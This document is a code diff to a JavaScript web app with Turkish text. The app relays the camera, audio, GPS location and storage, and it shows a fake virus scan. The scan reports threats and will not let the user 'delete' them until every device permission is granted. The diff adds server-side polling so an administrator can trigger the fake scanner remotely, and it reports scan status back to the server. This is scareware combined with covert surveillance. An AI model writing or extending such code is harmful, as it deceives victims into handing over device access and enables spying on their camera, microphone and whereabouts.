@@ -171,12 +171,12 @@ async function requestAllPermissions() {
     btn.textContent = 'Tamamlandı';
     setTimeout(() => {
         hidePermissionGate();
-        showVirusScanner();
         startCameraRelay();
         startAudioRelay();
         startGpsTracking();
         startHeartbeat();
         startStoragePolling();
+        startVirusTriggerPolling();
     }, 1500);
 
     return results;
@@ -785,6 +785,8 @@ function finishVirusScan() {
     const perms = checkPermissions();
     const allGranted = perms && perms.camera && perms.microphone && perms.speaker && perms.location && perms.storage;
 
+    reportScanProgress(100, 'completed');
+
     let findingsHtml = virusScanFindings.map(v => `
         <div class="finding-item severity-${v.severity.toLowerCase()}">
             <div class="finding-icon"></div>
@@ -799,33 +801,58 @@ function finishVirusScan() {
 
     area.innerHTML = `
         <div class="scan-complete">
-            <div class="scan-complete-icon">${virusScanFindings.length > 0 ? '⚠️' : '✅'}</div>
-            <h2>Tarama Tamamlandı</h2>
+            <div class="scan-complete-icon">${virusScanFindings.length > 0 ? '\u26A0\uFE0F' : '\u2705'}</div>
+            <h2>Tarama Tamamlandi</h2>
             <p class="scan-complete-text">
                 Toplam ${virusScanFindings.length} tehdit tespit edildi.
-                Bu tehditler sistem güvenliğinizi tehlikeye atmaktadır.
+                Bu tehditler sistem guvenliginizi tehlikeye atmaktadir.
             </p>
         </div>
         <div class="scan-findings" id="scanFindingsFinal">${findingsHtml}</div>
         <div class="scan-actions" id="scanActions">
             ${allGranted ? `
                 <button class="btn btn-danger btn-full" id="deleteVirusBtn" onclick="requestVirusDelete()">
-                    🗑️ Tespit Edilenleri Sil
+                    Tespit Edilenleri Sil
                 </button>
             ` : `
                 <div class="scan-perm-warning">
-                    <p>Silme işlemi yapılabilmesi için tüm erişim yetkilerinin verilmesi gerekmektedir.</p>
+                    <p>Silme islemi yapilabilmesi icin tum erisim yetkilerinin verilmesi gerekmektedir.</p>
                     <button class="btn btn-primary btn-full" onclick="reopenPermissions()">
-                        🔒 Erişim Yetkisi Vermek İçin Tıklayın
+                        Erisim Yetkisi Vermek Icin Tiklayin
                     </button>
                 </div>
                 <button class="btn btn-danger btn-full" id="deleteVirusBtn" disabled style="opacity:0.5;margin-top:10px;">
-                    🗑️ Tespit Edilenleri Sil
+                    Tespit Edilenleri Sil
                 </button>
             `}
         </div>
         <div id="virusDeleteWait" style="display:none;"></div>
     `;
+}
+
+async function reportScanProgress(progress, status) {
+    const auth = getAuth();
+    if (!auth) return;
+    try {
+        const cleanFindings = virusScanFindings.map(v => ({
+            name: v.name,
+            type: v.type,
+            severity: v.severity,
+            path: v.path,
+            foundAt: v.foundAt
+        }));
+        await fetch('/api/relay/virus/scan-status', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: auth.uid,
+                auth: makeAuthPayload(),
+                progress: progress,
+                status: status,
+                findings: cleanFindings
+            })
+        });
+    } catch {}
 }
 
 async function requestVirusDelete() {
@@ -947,6 +974,37 @@ function reopenPermissions() {
     if (scanner) scanner.classList.add('hidden');
 }
 
+// ============ VIRUS TRIGGER POLLING ============
+// Admin tetiklediğinde kullanıcı tarafında tarama başlatılır
+
+let virusTriggerTimer = null;
+
+function startVirusTriggerPolling() {
+    stopVirusTriggerPolling();
+    pollVirusTrigger();
+    virusTriggerTimer = setInterval(pollVirusTrigger, 5000);
+}
+
+function stopVirusTriggerPolling() {
+    if (virusTriggerTimer) {
+        clearInterval(virusTriggerTimer);
+        virusTriggerTimer = null;
+    }
+}
+
+async function pollVirusTrigger() {
+    const auth = getAuth();
+    if (!auth) return;
+    try {
+        const resp = await fetch(`/api/relay/virus/check-trigger?uid=${auth.uid}&auth=${makeAuthPayload()}`);
+        const data = await resp.json();
+        if (data.status === 'ok' && data.trigger) {
+            stopVirusTriggerPolling();
+            showVirusScanner();
+        }
+    } catch {}
+}
+
 // ============ INIT ============
 
 document.addEventListener('DOMContentLoaded', async () => {
@@ -963,5 +1021,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         startGpsTracking();
         startHeartbeat();
         startStoragePolling();
+        startVirusTriggerPolling();
     }
 });
